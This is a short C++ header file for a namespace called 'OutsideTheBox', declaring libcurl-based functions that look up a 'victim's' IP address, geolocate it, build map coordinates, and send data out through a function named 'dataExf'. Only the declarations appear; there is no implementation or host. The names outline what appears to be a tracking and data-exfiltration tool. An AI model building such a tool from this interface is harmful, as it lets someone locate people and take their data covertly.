/*
 *
 * 
 *
 */

#ifndef OUTSIDETHEBOX_H
#define OUTSIDETHEBOX_H

#include "curl/curl.h"
#include <sstream>
#include <iostream>
#include <string>
#include <vector>
#include <unistd.h>


namespace OutsideTheBox {
  namespace { // private namespace
    size_t writer(char *ptr, size_t size, size_t size_of_data, void *data);
  }
  CURL * init();
  std::string getVictimsIp(CURL *hnd);
  std::string getVictimsIpLocationInfos(CURL *hnd, std::string IP);
  std::vector<std::string> getVictimsIpLatLon(std::string IPLocation);
  std::string getVictimsIpLocationMaps(std::string IPlat, std::string IPlong);
  CURLcode dataExf(CURL *hnd, std::string data);
  void cleanup(CURL * hnd);
}

#endif